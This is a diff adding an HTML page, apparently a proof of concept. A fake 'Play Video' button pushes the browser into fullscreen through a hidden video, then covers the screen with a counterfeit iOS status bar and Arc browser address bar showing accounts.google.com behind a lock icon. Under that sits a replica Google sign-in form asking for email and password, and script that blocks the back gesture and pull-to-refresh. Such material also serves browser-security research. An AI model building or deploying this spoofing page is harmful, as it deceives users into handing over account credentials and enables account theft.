@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Test</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-user-select: none; -webkit-touch-callout: none; }
+body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #fff; }
+.trigger { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 40px 20px; text-align: center; }
+.trigger h2 { font-size: 20px; color: #1d1d1f; margin-bottom: 12px; }
+.trigger p { color: #86868b; font-size: 14px; margin-bottom: 24px; }
+.trigger button { background: #007aff; color: white; border: none; padding: 14px 40px; border-radius: 12px; font-size: 17px; font-weight: 600; -webkit-tap-highlight-color: transparent; }
+
+/* ============================================ */
+/* SPOOF OVERLAY - covers entire screen        */
+/* ============================================ */
+#spoof {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100vw;
+  height: 100vh;
+  z-index: 999999;
+  background: #fff;
+  flex-direction: column;
+}
+#spoof.active { display: flex; }
+
+/* iOS Status Bar area */
+.fake-status {
+  height: env(safe-area-inset-top, 54px);
+  min-height: 48px;
+  background: #fff;
+  display: flex;
+  align-items: flex-end;
+  justify-content: space-between;
+  padding: 0 24px 6px;
+  font-size: 15px;
+  font-weight: 600;
+  color: #000;
+  flex-shrink: 0;
+}
+
+/* TOP address bar (shown in fullscreen mode) */
+.fake-top-bar {
+  height: 40px;
+  background: #f2f2f7;
+  margin: 4px 16px 0;
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  padding: 0 14px;
+  font-size: 14px;
+  color: #1d1d1f;
+  flex-shrink: 0;
+}
+
+/* Page content area */
+.fake-content {
+  flex: 1;
+  overflow-y: auto;
+  -webkit-overflow-scrolling: touch;
+  background: #fff;
+}
+
+/* BOTTOM address bar (Arc iOS default position) */
+.fake-bottom-bar {
+  flex-shrink: 0;
+  background: #f9f9f9;
+  border-top: 0.5px solid #d1d1d6;
+  padding: 8px 16px;
+  padding-bottom: calc(8px + env(safe-area-inset-bottom, 0px));
+}
+.fake-bottom-url {
+  height: 36px;
+  background: #e8e8ed;
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  color: #1d1d1f;
+  gap: 6px;
+}
+.fake-bottom-nav {
+  display: flex;
+  justify-content: space-around;
+  align-items: center;
+  padding: 10px 0 2px;
+}
+.fake-bottom-nav span {
+  font-size: 20px;
+  color: #8e8e93;
+  padding: 4px 12px;
+}
+
+/* Lock icon */
+.lock-icon {
+  display: inline-block;
+  width: 10px;
+  height: 12px;
+}
+</style>
+</head>
+<body>
+
+<!-- TRIGGER PAGE -->
+<div class="trigger" id="trigger">
+  <h2>Watch this video</h2>
+  <p>Tap play to start</p>
+  <button onclick="launchSpoof()">▶ Play Video</button>
+</div>
+
+<!-- SPOOF OVERLAY -->
+<div id="spoof">
+  <!-- iOS Status Bar -->
+  <div class="fake-status">
+    <span>9:41</span>
+    <span style="font-size:13px;">5G &nbsp;🔋</span>
+  </div>
+
+  <!-- Top address bar (visible in fullscreen) -->
+  <div class="fake-top-bar">
+    <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="#34c759" stroke-width="3"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+    &nbsp;&nbsp;accounts.google.com
+  </div>
+
+  <!-- Main content -->
+  <div class="fake-content" id="fake-content">
+    <!-- Google Sign-in page replica -->
+    <div style="max-width:360px;margin:40px auto;padding:20px;text-align:center;">
+      <div style="width:75px;height:24px;margin:0 auto 30px;">
+        <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+          <text x="0" y="20" font-family="-apple-system,sans-serif" font-size="22" font-weight="500">
+            <tspan fill="#4285f4">G</tspan><tspan fill="#ea4335">o</tspan><tspan fill="#fbbc05">o</tspan><tspan fill="#4285f4">g</tspan><tspan fill="#34a853">l</tspan><tspan fill="#ea4335">e</tspan>
+          </text>
+        </svg>
+      </div>
+      <h1 style="font-size:22px;font-weight:400;color:#202124;margin-bottom:8px;">Sign in</h1>
+      <p style="font-size:15px;color:#202124;margin-bottom:28px;">to continue to Google Account</p>
+
+      <div style="text-align:left;margin-bottom:16px;">
+        <input type="email" placeholder="Email or phone"
+          style="width:100%;padding:14px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;-webkit-appearance:none;background:#fff;"
+          onfocus="this.style.borderColor='#1a73e8';this.style.borderWidth='2px';"
+          onblur="this.style.borderColor='#dadce0';this.style.borderWidth='1px';">
+      </div>
+
+      <div style="text-align:left;margin-bottom:24px;">
+        <input type="password" placeholder="Enter your password"
+          style="width:100%;padding:14px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;-webkit-appearance:none;background:#fff;"
+          onfocus="this.style.borderColor='#1a73e8';this.style.borderWidth='2px';"
+          onblur="this.style.borderColor='#dadce0';this.style.borderWidth='1px';">
+      </div>
+
+      <div style="text-align:left;margin-bottom:30px;">
+        <a style="color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500;">Forgot email?</a>
+      </div>
+
+      <p style="font-size:13px;color:#5f6368;text-align:left;margin-bottom:30px;line-height:1.5;">
+        Not your device? Use Guest mode to sign in privately.
+        <a style="color:#1a73e8;text-decoration:none;font-weight:500;"> Learn more about using Guest mode</a>
+      </p>
+
+      <div style="display:flex;justify-content:space-between;align-items:center;">
+        <a style="color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500;">Create account</a>
+        <button style="background:#1a73e8;color:white;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;">Next</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bottom bar (Arc iOS style) -->
+  <div class="fake-bottom-bar">
+    <div class="fake-bottom-url">
+      <svg width="10" height="12" viewBox="0 0 24 24" fill="none" stroke="#34c759" stroke-width="3"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+      accounts.google.com
+    </div>
+    <div class="fake-bottom-nav">
+      <span>◀</span>
+      <span>▶</span>
+      <span style="font-size:24px;">⊕</span>
+      <span>⊡</span>
+      <span>☰</span>
+    </div>
+  </div>
+</div>
+
+<!-- Hidden video for iOS fullscreen trigger -->
+<video id="fs-video" playsinline webkit-playsinline muted
+  style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;"
+  src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAAhtZGF0AAAA0m1vb3YAAABsbXZoZAAAAAAAAAAAAAAAAAAAA+gAAAAAAAEAAAEAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAABidWR0YQAAAFptZXRhAAAAIWhkbHIAAAAAAAAAAG1kaXJhcHBsAAAAAAAAAAAAAAAALWlsc3QAAAAlqXRvbwAAAB1kYXRhAAAAAQAAAABMYXZmNTguNDUuMTAw">
+</video>
+
+<script>
+function launchSpoof() {
+  let video = document.getElementById('fs-video');
+  let spoof = document.getElementById('spoof');
+
+  // Try to enter fullscreen via video (iOS way)
+  video.play().then(function() {
+    // Attempt fullscreen
+    let entered = false;
+
+    try {
+      if (video.webkitEnterFullscreen) {
+        video.webkitEnterFullscreen();
+        entered = true;
+      }
+    } catch(e) {}
+
+    if (!entered) {
+      try {
+        if (document.documentElement.requestFullscreen) {
+          document.documentElement.requestFullscreen();
+          entered = true;
+        } else if (document.documentElement.webkitRequestFullscreen) {
+          document.documentElement.webkitRequestFullscreen();
+          entered = true;
+        }
+      } catch(e) {}
+    }
+
+    // Show spoof overlay regardless (works with or without fullscreen)
+    setTimeout(function() {
+      // Pause and hide video
+      video.pause();
+      // Exit video fullscreen but keep our overlay
+      try { document.exitFullscreen(); } catch(e) {}
+      try { document.webkitExitFullscreen(); } catch(e) {}
+      try { video.webkitExitFullscreen(); } catch(e) {}
+
+      // Show spoof
+      document.getElementById('trigger').style.display = 'none';
+      spoof.classList.add('active');
+    }, 800);
+
+  }).catch(function() {
+    // Video couldn't play — just show overlay
+    document.getElementById('trigger').style.display = 'none';
+    spoof.classList.add('active');
+  });
+}
+
+// Prevent back gesture / swipe
+window.addEventListener('popstate', function(e) {
+  history.pushState(null, '', window.location.href);
+});
+history.pushState(null, '', window.location.href);
+
+// Prevent pull-to-refresh
+document.body.addEventListener('touchmove', function(e) {
+  if (document.getElementById('spoof').classList.contains('active')) {
+    let content = document.getElementById('fake-content');
+    if (content.scrollTop <= 0) {
+      e.preventDefault();
+    }
+  }
+}, { passive: false });
+</script>
+
+</body>
+</html>
